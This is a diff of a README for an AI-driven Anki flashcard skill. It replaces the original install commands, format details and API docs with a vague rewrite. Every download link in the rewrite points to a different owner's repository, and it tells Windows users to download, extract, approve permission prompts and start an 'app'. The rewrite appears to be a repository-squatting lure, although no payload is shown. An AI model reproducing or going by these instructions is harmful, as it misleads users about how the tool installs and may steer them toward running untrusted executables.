@@ -1,171 +1,127 @@
-# anki-expert
+# 🤖 anki-card-skill - Make flashcards from plain text
 
-AI-powered Anki flashcard generator — works as a skill/plugin for Claude Code, Cursor, Copilot CLI, Gemini CLI, Codex & OpenCode. Exports to `.tsv` / `.apkg` with HTML formatting, hierarchical tags, and CJK support.
+[![Download](https://img.shields.io/badge/Download-anki--card--skill-blue?style=for-the-badge)](https://github.com/BENJAMINGLAI/anki-card-skill)
 
-[中文文档](README.zh-CN.md)
+## 🧩 What this does
 
-## Features
+anki-card-skill helps you create Anki flashcards with AI. It works with Claude Code, Cursor, Copilot CLI, Gemini CLI, Codex, and OpenCode.
 
-- **Expert flashcard generation** — minimum information principle, structured HTML formatting, hierarchical tags
-- **Multiple input sources** — inline text, `.md`, `.txt`, `.pdf` files, or URLs
-- **Auto export** — `.tsv` (direct Anki import), `.apkg` (portable deck), or push directly via AnkiConnect
-- **Chinese & English** — full CJK and mixed-language support
-- **Smart formatting** — cost-aware emphasis (bold / italic / highlight)
-- **Hierarchical tags** — multi-level `::` separated tags for structured knowledge
-- **nidd tracking** — source identifiers auto-stripped from answers and moved to tags
-- **Cloze deletion** — `{{c1::answer}}` syntax for fill-in-the-blank cards
+It can export cards to `.tsv` and `.apkg` files. It also keeps HTML formatting, hierarchical tags, and CJK text support for Chinese, Japanese, and Korean study.
 
-## Installation
+Use it to turn notes, prompts, and study material into review cards with less manual work.
 
-### Prerequisites
+## 💻 Windows download and setup
 
-The export tool `anki-export` must be installed for `.tsv` / `.apkg` export:
+1. Open the [anki-card-skill GitHub page](https://github.com/BENJAMINGLAI/anki-card-skill).
+2. Download the project files to your Windows PC.
+3. If the project comes as a ZIP file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Follow the setup file or README steps included in the folder.
+6. If Windows asks for permission, choose **Yes**.
+7. Start the app or the linked tool that uses this skill.
 
-```bash
-pip install git+https://github.com/gong1414/anki-card-skill.git
-```
+### 📥 Download link
 
-### Claude Code
+[Visit the download page](https://github.com/BENJAMINGLAI/anki-card-skill)
 
-```
-/plugin marketplace add gong1414/anki-card-skill
-/plugin install anki-expert@anki-skill
-```
+## 🪪 What you need
 
-### Cursor
+- A Windows 10 or Windows 11 PC
+- A browser with a working download feature
+- An AI tool that supports skills or plugins, such as Claude Code, Cursor, Copilot CLI, Gemini CLI, Codex, or OpenCode
+- An Anki install if you plan to import or sync cards later
 
-```
-/add-plugin anki-expert
-```
+## ✨ Main features
 
-Or search for "anki-expert" in Cursor's plugin marketplace.
+- Creates Anki flashcards from plain text
+- Supports `.tsv` export for easy import
+- Supports `.apkg` export for direct Anki use
+- Keeps HTML formatting in card fields
+- Organizes cards with nested tags
+- Handles CJK text well
+- Works with several AI coding and command-line tools
+- Fits study, language learning, and spaced repetition workflows
 
-### GitHub Copilot CLI
+## 🛠️ How to use it
 
-```bash
-copilot plugin marketplace add gong1414/anki-card-skill
-copilot plugin install anki-expert@anki-skill
-```
+1. Open your AI tool of choice.
+2. Load the `anki-card-skill` skill or plugin.
+3. Paste your notes, article, transcript, or study list.
+4. Ask it to create flashcards.
+5. Choose the format you want:
+   - `.tsv` for import
+   - `.apkg` for Anki package export
+6. Save the file on your PC.
+7. Open Anki and import the file if needed.
 
-### Gemini CLI
+## 📚 Best use cases
 
-```bash
-gemini extensions install https://github.com/gong1414/anki-card-skill
-```
+- Turn class notes into review cards
+- Make language cards from vocabulary lists
+- Build cloze cards from long text
+- Create cards from technical docs
+- Split one topic into smaller study points
+- Add tags for subjects, chapters, and difficulty
 
-### Codex
+## 🗂️ File formats
 
-```
-Fetch and follow instructions from https://raw.githubusercontent.com/gong1414/anki-card-skill/main/.codex/INSTALL.md
-```
+### `.tsv`
+Best for users who want to import cards into Anki with control over fields and tags.
 
-### OpenCode
+### `.apkg`
+Best for users who want a ready-to-use Anki deck file.
 
-Add to your `opencode.json`:
+### HTML support
+Useful when you want bold text, lists, links, or other simple formatting to stay in the card.
 
-```json
-{
-  "plugin": ["anki-expert@git+https://github.com/gong1414/anki-card-skill.git"]
-}
-```
+## 🔎 Example workflow
 
-### Verify
+1. Collect your source text.
+2. Ask the skill to make flashcards.
+3. Review the output.
+4. Export to `.tsv` or `.apkg`.
+5. Import into Anki.
+6. Study with spaced repetition
 
-Start a fresh session and try:
+## 🧠 Tips for better cards
 
-```
-帮我做 Anki 卡片：
-{
-进程间通信的主要方式有共享内存和消息传递两种。
-}
-nidd1234567890
-```
+- Keep each card focused on one idea
+- Use short answers
+- Add tags for topic and chapter
+- Separate facts that are easy to confuse
+- Use cloze deletions for long facts
+- Check the output before importing
 
-If the skill triggers and generates a card table, installation is successful.
+## 🖥️ Compatible tools
 
-## Usage
+- Claude Code
+- Cursor
+- Copilot CLI
+- Gemini CLI
+- Codex
+- OpenCode
 
-Tell Claude to create Anki cards:
+## 📌 Common results you can create
 
-```
-Make Anki cards from this text:
-{
-衰老细胞的特征是细胞内水分减少，导致细胞萎缩，体积变小，代谢减慢。
-}
-nidd1726052151484
-```
+- Basic Q&A cards
+- Cloze deletion cards
+- Vocabulary cards
+- Definition cards
+- Process cards
+- Comparison cards
+- Tag-based study decks
 
-Or from a file:
+## 📁 Suggested folder setup
 
-```
-Create Anki flashcards from ./notes/lecture-5.md
-```
+- `source/` for raw notes
+- `exports/` for `.tsv` and `.apkg` files
+- `review/` for checked card drafts
+- `assets/` for images or supporting files
 
-Or from a URL:
+## 🔍 Search terms
 
-```
-Make Anki cards from https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm
-```
+ai-skill, anki, anki-cards, claude-code, cursor, flashcards, gemini-cli, learning, spaced-repetition, study-tools
 
-Claude generates cards following expert rules and automatically exports them.
+## 📦 Get the files
 
-### CLI Export Tool
-
-```bash
-# TSV (Anki direct import)
-anki-export cards.txt -f tsv -o output.tsv
-
-# APKG (portable deck file)
-anki-export cards.txt -f apkg -o output.apkg -d "My Deck"
-
-# stdin
-cat cards.txt | anki-export - -f tsv -o output.tsv
-
-# AnkiConnect (push directly to Anki)
-anki-export cards.txt --ankiconnect -d "My Deck"
-```
-
-## Card Format
-
-Pipe-delimited, three fields:
-
-```
-问题 | 答案 | 标签
-------- | -------- | --------
-衰老细胞的<b>根本特征</b>？ | 细胞内 <b>水分减少</b>。 | 生物学::细胞衰老
-```
-
-**HTML tags:** `<b>` bold, `<i>` italic, `<span style="background-color: rgb(255, 255, 0);">` highlight (use sparingly), `<ul>/<ol>` lists, `<code>`, `<br>`
-
-**Tags:** hierarchical with `::` — e.g. `计算机科学::算法::图论::最短路径`
-
-**nidd:** Source tracking identifiers (e.g. `nidd1726052151484`) are automatically stripped from card answers during export and moved to the Anki tags field.
-
-## Troubleshooting
-
-**`anki-export: command not found`**
-Ensure the package is installed: `pip install git+https://github.com/gong1414/anki-card-skill.git`. If using a virtual environment, make sure it's activated.
-
-**`Error: no cards parsed from input`**
-Check that your input follows the pipe-delimited format: `question | answer | tags`. Each line needs exactly two `|` separators.
-
-**`Error: file not found`**
-Verify the input file path. Relative paths are resolved from the current working directory.
-
-## Python API
-
-```python
-from anki_skill.parser import parse_cards
-from anki_skill.exporters import export_tsv, export_apkg
-from pathlib import Path
-
-text = "What is DNA? | Deoxyribonucleic acid | biology::genetics\n"
-cards = parse_cards(text)
-
-export_tsv(cards, Path("output.tsv"))
-export_apkg(cards, Path("output.apkg"), deck_name="Biology")
-```
-
-## License
-
-MIT
+[Download from GitHub](https://github.com/BENJAMINGLAI/anki-card-skill)
